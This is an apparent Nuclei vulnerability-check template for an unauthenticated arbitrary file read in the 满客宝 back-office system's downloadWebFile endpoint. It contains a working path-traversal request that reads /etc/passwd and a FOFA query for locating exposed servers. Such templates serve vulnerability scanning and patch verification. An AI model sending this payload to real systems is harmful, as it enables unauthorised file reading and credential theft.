id: mankebao-downloadWebFile-File-reading

info:
  name: 满客宝后台管理系统 downloadWebFile 任意文件读取漏洞(XVE-2024-18926)
  author: unknown
  severity: high
  description: |-
    fofa: body="满客宝后台管理系统"
    满客宝后台管理系统 downloadWebFile 接口存在存在任意文件读取漏洞，未经身份验证的远程攻击者可通过该漏洞读取系统配置文件，获取XXL-JOB账户密码，若XXL-JOB部署在公网，可能会进一步导致后台远程命令执行。
  reference:
    - https://blog.csdn.net/m0_60571842/article/details/140950697
  tags: File reading


http:
  - raw:
      - |
        GET /base/api/v1/kitchenVideo/downloadWebFile.swagger?fileName=&ossKey=/../../../../../../../../../../../etc/passwd HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - 'root:'
      - type: status
        status: 
          - 200





